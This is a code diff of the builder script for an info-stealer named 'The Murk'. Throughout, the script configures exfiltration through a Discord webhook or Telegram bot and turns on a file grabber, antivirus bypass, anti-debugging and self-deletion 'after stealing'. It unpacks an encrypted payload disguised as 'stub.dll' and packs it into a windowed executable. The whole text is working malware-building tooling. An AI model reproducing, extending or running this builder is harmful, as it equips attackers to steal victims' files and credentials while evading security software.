@@ -15,23 +15,19 @@
 
 import shutil
 import os 
-import win32con
-import win32api
-import pyzipper 
-import time
+import pyzipper
 
 
 
 
 class Builder():
     def __init__(self) -> None:
+        self.deps = ["cryptography","GPUtil","Pillow","psutil", "pyasn1", "pycryptodome", "pywin32", "pyzipper", "Requests", "WMI"]
         self.type = self.Menu()
         if self.type == "Discord" :
             self.Discord()
         if self.type == "Telegram" :
             self.Telegram()
-        if self.type == "XMPP" :
-            self.XMPP()
         self.Options()
 
     def Menu(self):
@@ -51,8 +47,8 @@ class Builder():
         print("\033[34m{}\033[0m".format(self.logo))
         print("\033[33m{}\033[0m".format("(i) Welcome to the Murk builder\n\n"))
         self.type = ""
-        while self.type != "Discord" and self.type != "Telegram" and self.type != "XMPP":
-            print("\033[36m\033[4m{}\033[0m".format("(?) Choose send type(Discord/Telegram/XMPP)"))
+        while self.type != "Discord" and self.type != "Telegram":
+            print("\033[36m\033[4m{}\033[0m".format("(?) Choose send type(Discord/Telegram)"))
             self.type = input("\033[33m\033[1m{}\033[0m".format(">>> "))
         print("\n\n")
         return self.type
@@ -60,22 +56,12 @@ class Builder():
     def Discord(self):
         print("\033[36m\033[4m{}\033[0m".format("(?) WebHook URL"))
         self.urlWebHook = input("\033[33m\033[1m{}\033[0m".format(">>> "))
-        print("\033[36m\033[4m{}\033[0m".format("(?) Bot name"))
-        self.name = input("\033[33m\033[1m{}\033[0m".format(">>> " ))
     
     def Telegram(self):
         print("\033[36m\033[4m{}\033[0m".format("(?) HTTP API"))
         self.HTTP = input("\033[33m\033[1m{}\033[0m".format(">>> "))
         print("\033[36m\033[4m{}\033[0m".format("(?) Telegram ID"))
         self.ID = input("\033[33m\033[1m{}\033[0m".format(">>> " ))
-
-    def XMPP(self):
-        print("\033[36m\033[4m{}\033[0m".format("(?) jabberid"))
-        self.jabberid = input("\033[33m\033[1m{}\033[0m".format(">>> "))
-        print("\033[36m\033[4m{}\033[0m".format("(?) jabberpassword"))
-        self.jabberpassword = input("\033[33m\033[1m{}\033[0m".format(">>> " ))
-        print("\033[36m\033[4m{}\033[0m".format("(?) jabberreceiver"))
-        self.jabberreceiver = input("\033[33m\033[1m{}\033[0m".format(">>> " ))
 
     def Options(self):
         self.fileGrab = ""
@@ -103,11 +89,6 @@ class Builder():
             print("\033[36m\033[4m{}\033[0m".format("(?) Enable debuging mode(write \"n\" if you don't know what it is) [y/n]"))
             self.debuging = input("\033[33m\033[1m{}\033[0m".format(">>> "))
 
-        self.builder = ""
-        while self.builder != "Pyinstaller" and self.builder != "Nuitka" and self.builder != "Pyarmor":
-            print("\033[36m\033[4m{}\033[0m".format("(?) Choose building type(Nuitka/Pyinstaller/Pyarmor)"))
-            self.builder = input("\033[33m\033[1m{}\033[0m".format(">>> "))
-
         self.libs = ""
         while self.libs != "Y" and self.libs != "N" and self.libs != "n" and self.libs != "y":
             print("\033[36m\033[4m{}\033[0m".format("(?) Do you have all needed Python libs [y/n]"))
@@ -115,100 +96,79 @@ class Builder():
         print("\n\n")
 
         if self.libs == "N" or self.libs == "n":
-            fullPath = os.path.abspath('Modules.zip')
-            fullPath = fullPath.replace('\\Modules.zip', '')
-            os.chdir(f'{fullPath}/files')
-            os.system('start update.bat')
-            self.libs = "y"
-            os.chdir(f'{fullPath}')
-            
+            for dep in self.deps:
+                os.system(f'pip install {dep}')
+            print("\033[33m{}\033[0m".format("(i) All libraries installed"))
+            self.Build()
         else:
             self.Build()
-            self.libs = "n"
-
-        if self.libs == "Y" or self.libs == "y":
-            input("\033[33m{}\033[0m".format("(i) Press enter if all libraries installed"))
-            self.Build()
-            self.libs = "n"
 
     def Build(self):
         print("\033[33m{}\033[0m".format("\n\n(i) Building started"))
-        with pyzipper.AESZipFile('Modules.zip', 'r', compression=pyzipper.ZIP_STORED,
+        with pyzipper.AESZipFile('stub.dll', 'r', compression=pyzipper.ZIP_STORED,
                                  encryption=pyzipper.WZ_AES) as extracted_zip:
-            extracted_zip.extractall(pwd=str.encode('pwd'))
-        temp = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Temp'
-        try:
-            shutil.rmtree(temp + os.sep + 'buildingCache/', ignore_errors=True)
-        except:
-            pass
-        shutil.move('buildingCache/',temp)
-        win32api.SetFileAttributes(temp + os.sep + 'buildingCache/', win32con.FILE_ATTRIBUTE_HIDDEN)
+            extracted_zip.extractall(pwd=str.encode('The-Murk-stealer'))
+        path = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Temp'
+        shutil.rmtree(path + os.sep + r'__{12222301}__cache__', ignore_errors=True)
+        shutil.move(r'__{12222301}__cache__',path)
+        path = path + os.sep + r'__{12222301}__cache__'
         
         print("\033[33m{}\033[0m".format("(i) Reading vars..."))
-        with open(temp + os.sep + 'buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/config/config.py', 'r') as f:
+        with open(rf'{path}\\preferences\\config.py', 'r', encoding="utf-8") as f:
             data = f.read()
+            f.close()
 
         print("\033[33m{}\033[0m".format("(i) Changing vars..."))
 
         if self.fileGrab == "Y" or self.fileGrab == "y":
-            data = data.replace('enableFileGrabber = False #enable file grabber', 'enableFileGrabber = True')
+            data = data.replace('enableFileGrabber = False', 'enableFileGrabber = True')
 
         if self.avBypass == "Y" or self.avBypass == "y":
-            data = data.replace('avbypass = False #enable antiviruses bypass', 'avbypass = True')
+            data = data.replace('avbypass = False', 'avbypass = True')
         
         if self.destruct == "Y" or self.destruct == "y":
-            data = data.replace('selfDestruct = False #deletes itself after stealing','selfDestruct = True')
+            data = data.replace('selfDestruct = False','selfDestruct = True')
 
         if self.oneStart == "Y" or self.oneStart == "y":
-            data = data.replace('oneStart = False #enable this if you want logs to come only from unique computers', 'oneStart = True')
+            data = data.replace('oneStart = False', 'oneStart = True')
         
         if self.debuging == "Y" or self.debuging == "y":
-            data = data.replace('debuging = False #disable AntiDebug (do not change if you do not know what it is responsible for)', 'debuging = True')
+            data = data.replace('debuging = False', 'debuging = True')
         
         if self.type == "Discord" :
-            data = data.replace("sendType = 0 # 0 via Discord; 1 via Telegram; 2 via XMPP","sendType = 0")
-            data = data.replace('discordData = ["url of your WebHook","name of that WebHook"]',f'discordData = ["{self.urlWebHook}","{self.name}"]')
+            data = data.replace("sendData = [0,\"\",\"\"]",f"sendData = [0,\"{self.urlWebHook}\",\"null\"]")
         if self.type == "Telegram" :
-            data = data.replace("sendType = 0 # 0 via Discord; 1 via Telegram; 2 via XMPP","sendType = 1")
-            data = data.replace('TelegramData = ["HTTPAPI that you got from botFather","your chat ID"]',f'TelegramData = ["{self.HTTP}","{self.ID}"]')
-        if self.type == "XMPP" :
-            data = data.replace("sendType = 0 # 0 via Discord; 1 via Telegram; 2 via XMPP","sendType = 2")
-            data = data.replace('xmppData = ["jabberid","jabberpassword","jabberreceiver"]',f'xmppData = ["{self.jabberid}","{self.jabberpassword}","{self.jabberreceiver}"]')
+            data = data.replace("sendData = [0,\"\",\"\"]",f"sendData = [1,\"{self.HTTP}\",\"{self.ID}\"]")
 
         print("\033[33m{}\033[0m".format("(i) Writing vars..."))
 
-        with open(temp + os.sep + 'buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/config/config.py', 'w') as file:
+        with open(rf'{path}\\preferences\\config.py', 'w', encoding="utf-8") as file:
             file.write(data)
+            file.close()
+        
+        print("\033[33m{}\033[0m".format("(i) building..."))
+        try:
+            os.system(f"pyinstaller --noconfirm --onefile --windowed --icon \"{path}/preferences/icon.ico\" --name \"TheMurk\" --upx-dir \"{path}/upx-4.2.1-win64\" --version-file \"{path}/preferences/version.py\" --add-data \"{path}/manager;manager/\" --add-data \"{path}/preferences;preferences/\" --add-data \"{path}/targets;targets/\" --add-data \"{path}/progress.py;.\"  \"{path}/The_Murk.py\"")
+        except:
+            pass
 
-        fullPath = os.path.abspath('Modules.zip')
-        fullPath = fullPath.replace('\\Modules.zip', '')
-
-        os.chdir(temp + os.sep + 'buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/')
-        print("\033[33m{}\033[0m".format("(i) Compiling..."))
-        if self.builder == "Nuitka":
-            self.time = 180
-            os.system('start CompileNuitka.bat')
-        if self.builder == "Pyinstaller":
-            self.time = 5
-            os.system('start CompilePyinstaller.bat')
-        if self.builder == "Pyarmor":
-            self.time = 5
-            os.system('start CompilePyarmor.bat')
-        while not os.path.exists("TheMurk.exe") and not os.path.exists("dist/TheMurk.exe"):
-           pass
-
-        if os.path.exists("TheMurk.exe") or os.path.exists("dist/TheMurk.exe"):
-            print("\033[33m{}\033[0m".format("(i) Ending..."))
-            time.sleep(self.time)
-            os.chdir(f'{fullPath}')
-            os.makedirs("built")
-            try:
-                shutil.move(temp + os.sep + "buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/TheMurk.exe", fullPath+"/built")
-            except:
-                shutil.move(temp + os.sep + "buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/dist/TheMurk.exe", fullPath+"/built")
-
-        shutil.rmtree(temp + os.sep + 'buildingCache/', ignore_errors=True)
-        print("\033[33m{}\033[0m".format("(i) Done"))
+        shutil.rmtree(path, ignore_errors=True)
+        try:
+            os.remove("/build")
+            os.remove("TheMurk.spec")
+        except:
+            print("\033[31m{}\033[0m".format("(!) failed to remove cache"))
+        try:
+            os.rename("dist","built")
+        except:
+            print("\033[31m{}\033[0m".format("(!) failed to rename dist to built"))
+        
+        if os.path.exists("dist/TheMurk.exe") or os.path.exists("built/TheMurk.exe"):
+            print("\033[33m{}\033[0m".format("(i) Done"))
+            print("\033[33m{}\033[0m".format("(i) path to built file \"built\\TheMurk.exe\""))
+        else:
+            print("\033[31m{}\033[0m".format("(!) failed to built"))
+        
         input("\033[33m{}\033[0m".format("(i) Exit on enter..."))
 
 if __name__ == "__main__":
